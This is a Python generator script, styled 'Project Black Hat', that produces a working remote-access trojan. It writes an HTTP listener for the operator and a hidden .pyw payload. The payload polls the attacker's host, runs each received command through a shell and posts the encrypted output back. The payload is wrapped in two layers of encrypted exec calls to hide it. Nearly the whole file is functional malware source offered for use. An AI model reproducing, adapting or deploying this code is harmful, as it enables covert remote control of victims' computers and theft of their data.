import random, string, socket, subprocess, pyfiglet, cryptocode

print(pyfiglet.figlet_format("Project Black Hat: Generator"))  

def IPv4():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('10.254.254.254', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

print(f"[?] Your IPv4: {IPv4()}")
LHOST = str(input("\n[+] Enter LHOST: "))
LPORT = int(input("\n[+] Enter LPORT: "))
Domain = f"http://{LHOST}:{LPORT}"
print(f"\n[-] Domain: {Domain}")
number = random.randint(1000,10000)
Key = ''.join(random.choices(string.ascii_uppercase + string.digits, k = number))
print("\n>>> Generating ...")

Listener = f'''from http.server import BaseHTTPRequestHandler, HTTPServer
import os, cryptocode, pyfiglet
print(pyfiglet.figlet_format("Project Black Hat: Listener"))
LHOST = "{LHOST}"
LPORT = {LPORT}
print("[-] Listening ...")
print()
class Server_Filter(BaseHTTPRequestHandler):
    def do_GET(self):
        CMD = str(input('>>> '))
        encoded = cryptocode.encrypt(CMD,"{Key}")
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(encoded.encode())
    
    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        Post_Data = self.rfile.read(int(self.headers['Content-Length']))
        Raw_Data = Post_Data.decode()
        Data = cryptocode.decrypt(Raw_Data,"{Key}")
        print(Data)

if __name__ == '__main__':
    Server_Characteristic = HTTPServer((LHOST, LPORT), Server_Filter)
    try:
        Server_Characteristic.serve_forever()
    except KeyboardInterrupt:
        print('Server Closed')
        print()
'''
Payload = f'''import requests, subprocess, cryptocode
while True:
  try:
    get_raw_cmd = requests.get('{Domain}')
    raw_cmd = get_raw_cmd.text
    cmd = cryptocode.decrypt(raw_cmd,"{Key}")
    if 'Closed' in cmd:
        break
    else:
        output = subprocess.check_output(cmd, shell = True)
        Data = output.decode('utf-8')
        encoded = cryptocode.encrypt(Data,"{Key}")
        post_output = requests.post(url = '{Domain}', data = encoded)
  except Exception:
    cmd = "Error"          
'''
filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 3))

with open(f"Listener_{filename}.py","a") as file:
        file.write(Listener)        
print(f"\n[-] 'Listener_{filename}.py' is generated")

Long_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k = number))
Encoded = cryptocode.encrypt(Payload,f'{Long_key}')
Decoded = f"""import cryptocode 
exec(str(cryptocode.decrypt('{Encoded}','{Long_key}')))"""
Super_Long_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k = number))
Super_Encoded = cryptocode.encrypt(Decoded,f'{Super_Long_key}')
Super_Decoded = f"""import cryptocode
exec(str(cryptocode.decrypt('{Super_Encoded}','{Super_Long_key}')))"""

with open(f"Payload_{filename}.pyw","a") as file:
        file.write(Super_Decoded)
print(f"\n[-] 'Payload_{filename}.pyw' is generated\n")

Listening_optional = str(input("[+] Wanna active listening mode now ? (y/n): "))
try:
    if Listening_optional == "yes" or Listening_optional == "Yes" or Listening_optional == "Y" or Listening_optional == "y": 
        subprocess.call(f"python3 Listener_{filename}.py", shell = True)
    else:
        print("\n[-] Closed!\n")     
except KeyboardInterrupt:
    print('[-] Terminated!\n')
 
